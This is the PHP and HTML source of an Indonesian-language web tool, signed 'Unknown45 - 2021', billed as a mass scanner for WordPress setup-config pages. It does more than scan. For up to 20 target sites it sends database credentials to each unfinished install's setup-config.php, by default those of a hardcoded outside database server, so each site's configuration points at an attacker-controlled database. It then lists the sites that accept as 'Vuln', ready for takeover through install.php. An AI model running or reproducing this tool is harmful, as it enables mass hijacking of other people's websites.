<html>
<head>
<title>[+] Mass WP setup-config Scanner [+]</title>
<meta name="viewport" content="width=device-width, initial-scale=1" /> 
</head>
<script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css">
<body bgcolor="#1e1e1e" text="white" style="max-width: 100%">
<style>
  @import url('https://fonts.googleapis.com/css?family=Staatliches');
  @import url('https://fonts.googleapis.com/css?family=Helvetica');

textarea {
max-width: 90%;
width: 90%;
height: 150px;
resize: none;
outline: none;
overflow: auto;
background: transparent;
color: #ffffff;
}

textarea#note {
  width:100%;
    resize: none;
  display:block;
  max-width:100%;
  border: none;
    outline: none;
}

button {
  background: transparent;
    font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

input {
  background: transparent;
  font-family: Helvetica;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
  max-width: 95%;
}

font {
  font-family: Staatliches;
}

body::-webkit-scrollbar {
  width: 12px;               /* width of the entire scrollbar */
}

body::-webkit-scrollbar-track {
  background: ##1e1e1e;        /* color of the tracking area */
}

body::-webkit-scrollbar-thumb {
  background-color: ##1e1e1e;    /* color of the scroll thumb */
  border: 3px solid gray;  /* creates padding around scroll thumb */
}

.area {
  font-family: Courier;
}

nemu {
  color: green;
}

kgk {
  color: red;
}

error {
	color: yellow;
}
</style>
<script type="text/javascript">
	function dbnya(select) {
		if (select.value == 1) {
			document.getElementById('database').style.display = "block";
		} else {
			document.getElementById('database').style.display = "none";
		}
	}
</script>
<body>
<center>
<font face=courier new size=5>Mass WP setup-config Scanner<br><font size="3">Check wp setup-config yang vuln buat di install</font><font size="3"><hr>
<form method="post">
<textarea rows=1 name="url" placeholder="https://exploits.my.id/wp-admin/setup-config.php" required="true"></textarea><br><br>
<select id="db" onchange="dbnya(this);" name="db">
	<option value="0">Auto Database</option>
	<option value="1">Manual Database</option>
</select>
<br><br>
<div id="database" style="display: none">
	<font style="font-family: Helvetica">
		Host :  <input type="text" name="host"><br>
		Username : <input type="text" name="user"><br>
		Password : <input type="text" name="pass"><br>
		DB Name : <input type="text" name="dbname">
	</font>
	<br><br>
</div>
<input type="submit" name="go" value="Gaskan">
</form>
<?php
if (isset($_POST['go'])) {
	echo "<hr><pre style='text-align: left; white-space: pre-line;'>";
	if (empty($_POST['url'])) {
		exit("Url kok kosong ?");
	} else {
		$url = explode("\r\n", $_POST['url']);
		if (count($url) > 20) {
			die("List web tidak boleh lebih dari 20 !");
		}
	}
	echo "[+] Loading .... ( ".count($url)." sites )<br><br>";
	if ($_POST['db'] == "1") {
		$host = $_POST['host'];
		$user = $_POST['user'];
		$pass = $_POST['pass'];
		$dbname = $_POST['dbname'];
		if (empty($host) || empty($user) || empty($pass) || empty($dbname)) {
			die("Isi Yang Bener, Jangan Kosongin !");
		}
	} else {
		$host = "37.59.55.185";
		$user = "2vcRxCMQ9E";
		$pass = "5X5DO9bPRF";
		$dbname = "2vcRxCMQ9E";
	}
	echo "[+] Database Information<br>";
	echo "[+] DB Host : ".$host."<br>";
	echo "[+] DB User : ".$user."<br>";
	echo "[+] DB Pass : ".$pass."<br>";
	echo "[+] DB Name : ".$dbname."<br><br>";
	ob_implicit_flush();ob_end_flush();
	foreach ($url as $web) {
		if (substr($web, -16) !== "setup-config.php") {
			echo "[<error>Error</error>] ".htmlspecialchars($web)." Akhiran Url Harus setup-config.php !<br>";
			continue;
		} else {
			$web = $web."?step=2";
		}
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $web);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, 'dbhost='.$host.'&dbname='.$dbname.'&language=en_GB&prefix=wp'.rand().'_&pwd='.$pass.'&submit=Submit&uname='.$user);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
		curl_setopt($ch, CURLOPT_TIMEOUT, 30); 
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36");
		curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		$ekse = curl_exec($ch);
		if (preg_match("/Successful database connection|All right,|WordPress can now communicate with your database/", $ekse)) {
			echo "[<nemu>Vuln</nemu>] ".str_replace("setup-config.php?step=2", "install.php", $web)."<br>";
		} elseif (curl_errno($ch)) {
			echo "[<error>Timeout</error>] ".$web."<br>";
		} else {
			echo "[<kgk>Not Vuln</kgk>] ".$web."<br>";
		}
		curl_close($ch);
	}
	echo "<br>[~] Done</pre>";
}
?>
<hr><font face="courier" size="3">Unknown45 - 2021</font>